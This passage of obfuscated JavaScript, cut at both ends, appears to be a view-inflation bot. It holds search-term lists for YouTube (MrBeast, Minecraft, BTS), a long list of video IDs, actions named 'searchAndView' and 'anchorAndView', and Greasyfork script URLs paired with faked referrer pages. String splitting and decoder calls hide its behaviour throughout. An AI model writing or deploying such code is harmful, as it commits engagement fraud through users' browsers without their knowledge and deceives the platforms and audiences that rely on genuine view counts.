'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + V(0x11) + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](0x878 + -0x139 * -0x11 + 0x1b * -0x115)), searchTerms['push'](['moomoo.io\x20' + 'spyder'][V(0x6) + 'nd'](0x14 * 0x143 + -0x185 * -0x13 + 0x3611 * -0x1)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + W(0x14, 'UPnI') + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x5da + -0x3d * -0xa1 + -0x2080);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    X(0x4) + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    V(0x7) + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + W(0x19, 'OJZI') + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + W(0x1c, 'l8CM') + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + V(0x9) + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + W(0x13, 'oDx(') + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': V(0x1) + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + W(0xb, 'vRC0') + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + W(0xe, '7vR[') + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
